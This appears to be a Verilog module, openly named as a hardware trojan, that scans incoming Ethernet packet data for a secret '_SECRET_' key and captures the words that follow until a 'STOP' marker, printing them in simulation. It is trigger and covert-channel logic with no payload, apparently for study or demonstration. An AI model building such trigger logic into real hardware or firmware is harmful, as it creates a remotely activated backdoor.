

//NOTE: In order to be successfully matched, the key must start on a word
//  boundary. This means it should be offset 2 bytes from the start of the UDP
//  data section. It should also be a multiple of four bytes

`define SECRET_KEY_0 32'h5f534543 // _SEC
`define SECRET_KEY_1 32'h5245545f // RET_

`define SECRET_END_0 32'h53544F50 // STOP

`define NO_MATCH   0
`define PART_MATCH 1
`define MATCH      2
`define END        4

module trojan (
    input wire i_clk,
    input wire i_rst,

    input wire [31:0] i_rx_packet_data,
    input wire        i_rx_packet_data_valid,
    input wire        i_rx_packet_reset
    );

    reg [31:0] trojan_data;
    reg        trojan_data_valid;

    // signals for watching ethernet RX
    reg [2:0] match_state;
    reg [2:0] match_state_nxt;
    reg [31:0] buffered_data;
    reg [31:0] buffered_data_nxt;
    reg        buffered_valid;
    reg        buffered_valid_nxt;

    wire valid = (i_rx_packet_data_valid && ~i_rx_packet_reset);

    always @(*) begin
        match_state_nxt = match_state;
        buffered_data_nxt = 32'hDEADBEEF;
        buffered_valid_nxt = 0;

        // Test for the key
        if (valid) begin
            case (match_state)
                `NO_MATCH: begin
                    if (i_rx_packet_data == `SECRET_KEY_0) begin
                        match_state_nxt = `PART_MATCH;
                    end
                end
                `PART_MATCH: begin
                    if (i_rx_packet_data == `SECRET_KEY_1) begin
                        match_state_nxt = `MATCH;
                    end else begin
                        match_state_nxt = `NO_MATCH;
                    end
                end
                `MATCH: begin
                    // Match found! Do things...
                    buffered_data_nxt = i_rx_packet_data;
                    buffered_valid_nxt = 1;
                    match_state_nxt = `MATCH;

                    // look for data to end
                    if (i_rx_packet_data == `SECRET_END_0) begin
                        buffered_data_nxt = 32'h0;
                        buffered_valid_nxt = 0;
                        match_state_nxt = `END;
                    end
                end
                `END: begin
                    // return to searching for start of data
                    match_state_nxt = `NO_MATCH;
                end
                default: begin
                    // How did we get here?
                    match_state_nxt = `NO_MATCH;
                end
            endcase
        end
    end

    always @(posedge i_clk) begin
        if (i_rst) begin
            trojan_data <= 32'h0;
            trojan_data_valid <= 0;

            match_state <= `NO_MATCH;
            buffered_data <= 32'h0;
            buffered_valid <= 0;

        end else begin
            trojan_data <= buffered_data;
            trojan_data_valid <= buffered_valid;

            match_state <= match_state_nxt;
            buffered_data <= buffered_data_nxt;
            buffered_valid <= buffered_valid_nxt;

        end
    end

    // Display text in human readable form for simulation
    always @(posedge i_clk) begin
        if (!i_rst && valid) begin
            $display("RX Data Received: %X %X %X %X  (%d %d %d %d) \"%c %c %c %c\"\n",
                i_rx_packet_data[31:24], i_rx_packet_data[23:16], i_rx_packet_data[15:8], i_rx_packet_data[7:0],
                i_rx_packet_data[31:24], i_rx_packet_data[23:16], i_rx_packet_data[15:8], i_rx_packet_data[7:0],
                i_rx_packet_data[31:24], i_rx_packet_data[23:16], i_rx_packet_data[15:8], i_rx_packet_data[7:0],
            );
        end

        if (!i_rst && trojan_data_valid) begin
            $display("Trojan Data: 0x%X\n", trojan_data);
        end
    end
endmodule
